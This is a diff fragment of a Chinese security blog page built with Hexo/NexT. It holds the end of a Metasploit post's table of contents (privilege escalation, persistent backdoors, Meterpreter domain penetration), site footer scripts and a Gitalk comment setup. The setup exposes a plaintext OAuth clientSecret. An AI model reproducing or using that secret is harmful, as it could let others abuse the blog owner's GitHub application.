href="#metasploit之提权"><span class="nav-number">5.</span> <span class="nav-text">metasploit之提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#建立持久后门"><span class="nav-number">6.</span> <span class="nav-text">建立持久后门</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Meterpreter域渗透"><span class="nav-number">7.</span> <span class="nav-text">Meterpreter域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#添加路由"><span class="nav-number">7.1.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter-脚本"><span class="nav-number">7.2.</span> <span class="nav-text">Meterpreter 脚本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Metasploit结合Nmap-lua语言"><span class="nav-number">8.</span> <span class="nav-text">Metasploit结合Nmap(lua语言)</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
